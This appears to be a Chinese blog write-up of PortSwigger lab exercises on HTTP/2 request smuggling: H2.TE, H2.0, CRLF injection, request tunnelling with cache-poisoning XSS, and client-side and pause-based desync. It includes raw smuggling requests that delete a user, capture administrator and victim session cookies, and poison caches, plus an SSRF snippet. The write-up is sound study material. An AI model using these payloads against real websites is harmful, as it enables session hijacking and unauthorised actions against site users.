<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250501221256670.png" alt="image-20250501221256670"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0ad600200454f10d8187110b00140041.web-security-academy.net</span><br><span class="line">Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: script</span><br><span class="line">Referer: https://0ad600200454f10d8187110b00140041.web-security-academy.net/post/comment/confirmation?postId=10</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: u=1</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">GET /resources/labheader/images/ps-lab-notsolved.svg HTTP/1.1</span><br><span class="line">Host: 0ad600200454f10d8187110b00140041.web-security-academy.net</span><br><span class="line">Foo: X</span><br></pre></td></tr></table></figure>



<h4 id="H2-TE"><a href="#H2-TE" class="headerlink" title="H2.TE:"></a>H2.TE:</h4><p>原理跟上一个差不多</p>
<p><strong>前端服务器遇到HTPP&#x2F;2的时候进行降级时会添加HTTP&#x2F;1请求头，如果降级之前没有验证或删除<code>Transfer-Encoding</code>，那我们就可以注入<code>Transfer-Encoding</code>头，造成请求走私。</strong></p>
<h5 id="重点-当我们在成功之后对HTTP-2改成HTTP-1-1发现不能请求走私的原因"><a href="#重点-当我们在成功之后对HTTP-2改成HTTP-1-1发现不能请求走私的原因" class="headerlink" title="重点:当我们在成功之后对HTTP&#x2F;2改成HTTP&#x2F;1.1发现不能请求走私的原因:"></a>重点:当我们在成功之后对HTTP&#x2F;2改成HTTP&#x2F;1.1发现不能请求走私的原因:</h5><p><strong>原因在于前端服务器对HTTP&#x2F;1.1的请求会进行te和cl的检测和验证</strong></p>
<p><strong>遇到HTTP&#x2F;2的时候不会并且对他们进行降级</strong></p>
<p><strong>所以才存在这个类型的漏洞</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a4a00ef04db2deb808e03950077005c.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: 0a4a00ef04db2deb808e03950077005c.web-security-academy.net</span><br><span class="line">Cookie: session=whF1fXAlIu4igEcgBjMxC2PgfCbVihoT</span><br><span class="line">Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Referer: https://0a4a00ef04db2deb808e03950077005c.web-security-academy.net/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: u=2, i</span><br></pre></td></tr></table></figure>

<h4 id="H2-0-漏洞"><a href="#H2-0-漏洞" class="headerlink" title="H2.0 漏洞:"></a>H2.0 漏洞:</h4><p>有点像CL.0</p>
<p>后端默认为0并且忽略了cl</p>
<p>所以前端如果接受到cl</p>
<p>那么这个时候就会出现请求走私</p>
<p>收到的所有cl都会成为下一个数据</p>
<p><strong>如果后端服务器忽略已降级请求的<code>Content-Length</code>请求头，则容易受到等效的“H2.0”漏洞的攻击。</strong></p>
<h3 id="使用场景利用点"><a href="#使用场景利用点" class="headerlink" title="使用场景利用点:"></a>使用场景利用点:</h3><p><strong>想要把受害者正常的请求回显出来要去找服务器端点有没有什么类似于公共留言版的地方才可以</strong></p>
<ol>
<li>存在回显或间接回显的端点<ul>
<li>目标服务器需存在能返回请求内容的功能（如留言板、搜索框、错误页面、日志接口等）。</li>
<li>例如：<code>/search?query=test</code> 返回包含<code>test</code>的页面。</li>
</ul>
</li>
<li>恶意请求能被后端处理并存储&#x2F;返回<ul>
<li>走私的第二个请求需触发服务端记录或显示数据（如写入数据库、生成错误日志等）。</li>
</ul>
</li>
</ol>
<p><strong>或者有没有什么可以外带的地方</strong></p>
<p><strong>如果要外带那么Host请求头可能会出现两个就会重复</strong></p>
<p><strong>这个时候就要用cl请求头去提前截止在第二个Host请求之前</strong></p>
<p><strong>然后构造的外带请求要自己写</strong></p>
<p><strong>注意:如果仅仅只是改host头服务器是不会把请求转发到外部的服务器的</strong></p>
<p><strong>除非服务器的有这样类似的逻辑才可以</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = f&quot;http://&#123;request.headers[&#x27;Host&#x27;]&#125;/internal&quot; </span><br><span class="line">requests.get(url)   # 触发SSRF，向DNSLog发起请求 </span><br></pre></td></tr></table></figure>



<p>还可以通过我们自己构造的第二个请求里的cl长度去对一些不想要的内容或者协议头重复的地方前进行截止</p>
<p>这样也可以变成一个完整的请求</p>
<p><strong>注意:如果是POST请求则一定需要第二个构造的请求里存在CL</strong></p>
<p><strong>不然会不能被当作一个正常的请求</strong></p>
<h5 id="除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个-r-n让他变成一个完整的请求"><a href="#除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个-r-n让他变成一个完整的请求" class="headerlink" title="除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个\r\n让他变成一个完整的请求"></a>除了上面使用到的对一个请求的提前截止的一些方法我们还可以在最后加两个\r\n让他变成一个完整的请求</h5><h3 id="使用场景-响应投毒"><a href="#使用场景-响应投毒" class="headerlink" title="使用场景:响应投毒"></a>使用场景:响应投毒</h3><h4 id="概念-缓存投毒和缓存欺骗"><a href="#概念-缓存投毒和缓存欺骗" class="headerlink" title="概念:缓存投毒和缓存欺骗:"></a>概念:缓存投毒和缓存欺骗:</h4><p><strong>前端服务器会缓存后端服务器资源可能会导致缓存欺骗和缓存投毒漏洞的存在</strong></p>
<p><strong>缓存投毒的原理是:让一个正常的静态文件变成一个恶意的js或者其他形式的代码或者文件</strong></p>
<p><strong>攻击者让用户和前端服务器都认为访问的是正常目录&#x2F;home但是由于后端的请求走私实际返回的内容是一个恶意的&#x2F;js&#x2F;hacker.js的内容.当他们两个之间多次被人访问的时候存在缓存.也就导致缓存投毒.</strong></p>
<p><strong>缓存欺骗的原理是:通过把目标用户存储关键信息api等等路径如my-account的响应内容缓存到一个静态路径是&#x2F;js&#x2F;test.js的请求路径</strong></p>
<p><strong>这个时候攻击者就可以访问获取&#x2F;js&#x2F;test.js获取api等等</strong></p>
<p><strong>用户虽然访问了&#x2F;js&#x2F;test.js前端服务器也认为是&#x2F;js&#x2F;test.js但是由于请求走私的构造实际返回的内容是&#x2F;my-account这个时候也就形成了缓存.别人也就可以获取</strong></p>
<p><strong>投毒和欺骗的区别在于:</strong></p>
<p><strong>投毒是让用户加载恶意的代码然后攻击者这里被动的拿到关键信息什么的通过加载恶意的js.适用于获取cookie什么的.但是api不存储在浏览器里获取不到</strong></p>
<p><strong>如果需要获取某个路径下的数据则需要使用欺骗</strong></p>
<p><strong>欺骗是让用户的关键信息路径的内容和一个静态的公共文件路径形成缓存.这个时候攻击者再去获取静态文件拿到关键信息内容比如api等等</strong></p>
<h4 id="靶场案例"><a href="#靶场案例" class="headerlink" title="靶场案例:"></a>靶场案例:</h4><p>在最后加两个\r\n让他变成完整的请求之后</p>
<p>那么目标用户这个时候访问请求得到的响应就是第二个请求的响应.</p>
<p>那么我们该如何拿到用户的响应呢?</p>
<p>这个时候就用到了爆破.不断地爆破拿到用户的请求响应</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0acf00e5030b839e800303b2006a00ad.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">x=y</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 0acf00e5030b839e800303b2006a00ad.web-security-academy.net</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面最后空两行是因为有两个换行符\r\n</p>
<p>不断的爆破</p>
<p>我们就有机会拿到目标用户的响应</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 302 Found</span><br><span class="line">Location: /my-account?id=administrator</span><br><span class="line">Set-Cookie: session=2VbUAqb6BgRlEttMXZyJs3IgpWFTbDNq; Secure; HttpOnly; SameSite=None</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>靶场是这个<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling">https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling</a></p>
<p>原理图:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508135322510.png" alt="image-20250508135322510"></p>
<h3 id="HTTP2下关于绕过CL和te的检测手法"><a href="#HTTP2下关于绕过CL和te的检测手法" class="headerlink" title="HTTP2下关于绕过CL和te的检测手法:"></a>HTTP2下关于绕过CL和te的检测手法:</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection">HTTP&#x2F;2 request smuggling via CRLF injection</a></p>
<p>适用场景:HTTP&#x2F;2的降级情况下.才可以</p>
<p>通过右边的修改添加\r\n进行添加一个换行符绕过</p>
<p>这跟普通的换行符绕过是不同的</p>
<p>先看普通的换行符绕过包未绕过成功的情况下是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a6200e5042f0a2b8041037b00eb002a.web-security-academy.net</span><br><span class="line">Sec-Ch-Ua: &quot;Not/A)Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;126&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 562</span><br><span class="line">A: 1</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">x=y</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: 0a6200e5042f0a2b8041037b00eb002a.web-security-academy.net</span><br><span class="line">Cookie: session=A1r6UhopMritJ5QtfovkP8Iw5cx18EYe; _lab_analytics=YEZxczifpZQIdEmMILZlgRbva46pzRVgRcg9ugRyYYeere5qvA1T3kzbuvPygp6mJY0DwY5U2ZSMmLngNOvAFecybcFm6AohFn3gKmP0hKrcjNglmBnwoU7IfdYs2368oevsAqK8CF5jLJ4lhqm49yZGBhzM8kuOCbhYIuzHerAOsxQv8iWgcKlSKhO13WzPDQQpypfEhTVQD2x4w9lpUoucIMa8lqZxZb9pu3SLNbuPKo7rP8OJ13EOWB0RNdhm</span><br><span class="line">Content-Length: 1200</span><br><span class="line"></span><br><span class="line">csrf=hmUSrLLt37piaQCHMjtHLpSP9FaeVKld&amp;postId=9&amp;name=12312&amp;email=123@qq.com&amp;website=http://123.com&amp;comment=ff</span><br></pre></td></tr></table></figure>

<p>这样的包是不会出现请求走私</p>
<p>我们需要做的是</p>
<p>在右边HTTP&#x2F;2的伪头部里进行换行符的写入</p>
<p>仔细观察HTTP&#x2F;1和HTTP&#x2F;2的情况下右边的header是不一样的写法.</p>
<p>HTTP&#x2F;2的是伪头部</p>
<p><strong>示例：</strong> 一个 HTTP&#x2F;2 请求可能包含如下伪头部：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">:method: GET</span><br><span class="line">:path: /index.html</span><br><span class="line">:authority: www.example.com</span><br><span class="line">:scheme: https</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508155908041.png" alt="image-20250508155908041"></p>
<p>把Transfer-Encoding: chunked添加到右边的value里并且换行</p>
<p>这个时候再去点击一次apply changes</p>
<p>然后就会变成这样</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508160001665.png" alt="image-20250508160001665"></p>
<p>这个时候绕过也就成功了</p>
<p>我们尝试找个地方能让他回显出下一次请求的内容</p>
<p>有评论区或者搜索这个靶场里都可以做到</p>
<p>我这里用的是评论区</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508160110008.png" alt="image-20250508160110008"></p>
<p>把这个session拿到然后修改浏览器的session就可以了</p>
<h2 id="http2里的请求隧道攻击–请求走私的变种"><a href="#http2里的请求隧道攻击–请求走私的变种" class="headerlink" title="http2里的请求隧道攻击–请求走私的变种:"></a>http2里的请求隧道攻击–请求走私的变种:</h2><p><strong>如果前端和后端对我们这个请求不会搭建隧道也就是不复用tcp连接</strong><br><strong>我们可以把两个请求赛到一个请求里?这样也就可以看成是一个隧道?</strong></p>
<p><strong>只需要在HTTP2伪标头里CRLF换行注入就可以实现请求隧道攻击</strong></p>
<ul>
<li>即使前端和后端不复用连接（即不共享TCP连接处理多用户请求），攻击者仍可通过构造<strong>单连接内的歧义请求</strong>，让后端解析出多个请求（走私）。</li>
<li><strong>这本质上是请求走私的一种实现</strong>，而非严格意义的“隧道复用”，但效果类似（绕过前端检查，向后端注入请求）。</li>
</ul>
<h2 id="请求隧道的crlf注入漏洞的原理图"><a href="#请求隧道的crlf注入漏洞的原理图" class="headerlink" title="请求隧道的crlf注入漏洞的原理图:"></a>请求隧道的crlf注入漏洞的原理图:</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508210757019.png" alt="image-20250508210757019"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250508213120999.png" alt="image-20250508213120999"></p>
<p>根据图片我们可以知道第二个请求走私的响应内容客户端是收不到的?</p>
<p>但是我们可以通过改成HEAD头去看反应</p>
<p>出现两个HTTP&#x2F;1.1或者类似的两个Server Error都是代表着请求走私成功的意思</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 500 Internal Server Error</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 150</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Server Error: Proxy error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Server Error: Received only 516 of expected 3247 bytes of data&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>补充:这里的环境是前端拿到的第一个请求包的显示的长度</p>
<p>然后返回的内容是第二个请求包的内容</p>
<p>所以当长度和内容不匹配的时候会出现</p>
<p>Server Error: Received only 516 of expected 3247 bytes of data</p>
<h2 id="请求隧道走私缓存投毒笔记和当前比较有阶段性的总结"><a href="#请求隧道走私缓存投毒笔记和当前比较有阶段性的总结" class="headerlink" title="请求隧道走私缓存投毒笔记和当前比较有阶段性的总结:"></a>请求隧道走私缓存投毒笔记和当前比较有阶段性的总结:</h2><p><strong>请求隧道走私</strong></p>
<p><strong>就是通过伪标头crlf换行注入</strong></p>
<p><strong>实现绕过的前端</strong></p>
<p><strong>前端在降级HTTP&#x2F;2请求的时候会重写</strong></p>
<p><strong>这个时候识别到里面的CRLF然后就变成正常的换行请求进行写入</strong></p>
<p><strong>这个时候也就绕过了前端的检验</strong></p>
<p><strong>重写为http&#x2F;1.1的请求之后</strong></p>
<p><strong>一般一个就会变成两个请求</strong></p>
<p><strong>如果第一个请求是get那么返回的内容也是get.里面夹杂的第二个请求就算返回到前端.也最终不会显示到用户浏览器这里</strong></p>
<p><strong>原因是用户只发送了一个请求.前端服务器收到了两个来自后端服务器的响应.那么最终也只能返回一个响应包给用户</strong></p>
<p><strong>并且由于响应包里Content-Length的存在.导致第二个响应不能和第一个相应整合在一起</strong></p>
<p><strong>如何去实现让第二个响应的内容回显到用户这里或者说拼接到第一个响应的内容里呢</strong></p>
<p><strong>这个时候就用到了HEAD请求</strong></p>
<p><strong>他会返回响应头的内容</strong></p>
<p><strong>但是不会返回响应的具体数据.但是又由于响应头里存在Content-Length: 8401这个头</strong></p>
<p><strong>那么这个时候我们就可以把第二个响应包的数据放入形成一个新的响应</strong></p>
<p><strong>这个时候我们把第一个请求包的头改成HEAD</strong></p>
<p><strong>第二个请求是get情况下</strong></p>
<p><strong>我们最终得到的内容是</strong></p>
<p><strong>第一个响应的响应头和第二个响应的数据包内容</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516001640887.png" alt="image-20250516001640887"></p>
<p><strong>我们现在知道了可以把响应包内容控制到第一个响应包里面</strong></p>
<p><strong>那么如何让响应包的内容变成我们想要的呢</strong></p>
<p><strong>只需要找到一个目录接口</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516001804890.png" alt="image-20250516001804890"></p>
<p><strong>如图</strong></p>
<p><strong>当我们尝试给这个目录的接口写入一点东西的时候由于是一个文件夹的目录.他会帮我们把这个路径302跳转到文件夹的子路径里然后加上后面的值</strong></p>
<p><strong>那么这个时候test部分就是我们可以自由控制和编写</strong></p>
<p><strong>写点html标签和script就可以实现xss攻击</strong></p>
<p><strong>再回到我们的请求走私包的构造</strong></p>
<p><strong>当我们尝试去构造一个xss的payload之后我们可以发现</strong></p>
<p><strong>响应的时候会出现一个等待响应还是响应等待时间过长的报错回显(没有图忘记截图和懒得重启靶场了)</strong></p>
<p><strong>原因是当我们的响应头是Content-Length: 8401</strong></p>
<p><strong>那么意味着响应的内容应该是8401个字节的值</strong></p>
<p><strong>如果只写了个xss.那么不满足响应头这个数值的值</strong></p>
<p><strong>所以会让前端服务器以为还有后续的内容没有发送过来</strong></p>
<p><strong>然后一直等待响应</strong></p>
<p><strong>然后响应超时</strong></p>
<p><strong>这个时候我们需要做的是写入大量的字符让我们这个响应包的内容满足长度.甚至超出长度也没关系那样前端服务器会自动截取</strong></p>
<p><strong>但不要超过太多超过太多可能就到达前端服务器的处理上限也就报错了</strong></p>
<p><strong>这就是我们第一张图出现很多test的原因</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516002611696.png" alt="image-20250516002611696"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/image-20250516002630605.png" alt="image-20250516002630605"></p>
<p><strong>最后的最后就是这个靶场里的缓存漏洞实现原理很简单</strong></p>
<p><strong>我们频繁的在bp里发送这个恶意的包</strong></p>
<p><strong>然后就会形成缓存.别人访问&#x2F;路径的时候也就会出现我们写好的xss</strong></p>
<p><strong>然后造成危害</strong></p>
<p><strong>这个缓存是比较短暂的</strong></p>
<p><strong>可能十几秒或者一分钟缓存就会消失</strong></p>
<p><strong>这个时候你浏览器访问什么就是什么原来的内容</strong></p>
<p><strong>所以是缓存</strong></p>
<p><strong>所以需要利用的话要频繁发包</strong></p>
<h2 id="客户端不同步"><a href="#客户端不同步" class="headerlink" title="客户端不同步"></a>客户端不同步</h2><p>客户端不同步同步 (Client-Side Desync) 是一种特定的 HTTP 请求走私攻击技术，可以使受害者的 Web 浏览器与易受攻击的网站之间的连接失去同步。它主要利用的是客户端和服务器之间在处理 HTTP 请求时的不同步现象，而不一定需要多个服务器之间的解析差异。因此，即使在单服务器环境中，也可能会受到这种攻击的影响。<br><a target="_blank" rel="noopener" href="https://blog.hackall.cn/usr/uploads/2024/07/810474831.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://raw.githubusercontent.com/cxkhanhan/tu_chuang/main/810474831.png" alt="HTTP 请求走私漏洞详解"></a><br>当受害者访问包含恶意 JavaScript 的任意域（图中<code>evil.com</code>）上的网页时，恶意代码执行会导致受害者的浏览器向存在漏洞的网站（图中<code>example.com</code>）发出包含HTTP请求走私数据的请求，这一过程和CSRF有点相似。在服务器响应第一个请求后，走私请求会留在服务器上，从而导致与浏览器的连接不同步。后续请求会追加都走私请求后边，从而执行走私的请求，返回走私请求的响应。</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync">Client-side desync</a></p>
<p>这里贴一部分,感觉跟csrf有点关系利用环境有点严格,感兴趣的师傅可以看看这个文章里的</p>
<p><a target="_blank" rel="noopener" href="https://blog.hackall.cn/pentest/1079.html">HTTP 请求走私漏洞详解 - Hack All Sec的博客</a></p>
<h2 id="服务器端基于暂停的不同步"><a href="#服务器端基于暂停的不同步" class="headerlink" title="服务器端基于暂停的不同步"></a>服务器端基于暂停的不同步</h2><p>当后端服务器在超时后不会关闭连接时，使用服务器端基于暂停的不同步可以引发类似<code>CL.0</code>的效果。如果我们将以下请求发送到后端服务器时：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /example <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: vulnerable-website.<span class="property">com</span></span><br><span class="line"><span class="title class_">Connection</span>: keep-alive</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">34</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">GET</span> /hopefully404 <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Foo</span>: x</span><br></pre></td></tr></table></figure>

<p>只把请求头部分发送到后端服务器，然后停止发送请求主体部分的内容。后端服务器根据<code>Content-Length: 34</code>等待获取请求主体，但是一直没等到，直到超时并发送响应。然后发送请求主体。前端服务器将其视为初始请求的主体并通过同一连接将其转发到后端服务器。但是后端服务器已经响应了初始请求，因此把这些字节当作另一个请求的开始。当下一个请求被转发过来时，后端服务器收到的请求为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /hopefully404 <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Foo</span>: xGET /xx <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: xxx</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>此时我们实现 <code>CL.0</code> 的效果。<code>Apache 2.4.52</code>就容易受此影响。检测和利用此漏洞需要使用Burp的<code>Turbo Intruder</code>插件，直接在BApp store安装即可。</p>
<p>感兴趣的师傅可以看看这个文章里的.</p>
<p><a target="_blank" rel="noopener" href="https://blog.hackall.cn/pentest/1079.html">HTTP 请求走私漏洞详解 - Hack All Sec的博客</a></p>
